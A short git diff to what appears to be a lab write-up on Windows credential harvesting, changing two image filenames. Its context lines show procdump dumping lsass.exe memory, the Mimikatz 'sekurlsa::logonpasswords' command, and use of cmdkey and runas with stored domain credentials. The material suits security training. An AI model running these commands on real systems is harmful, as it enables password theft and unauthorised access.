@@ -317,7 +317,7 @@ c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimik
 sekurlsa::logonpasswords
 ```
 
-<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Windows Credential Manager
 
@@ -420,7 +420,7 @@ cmdkey /list
 
 The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
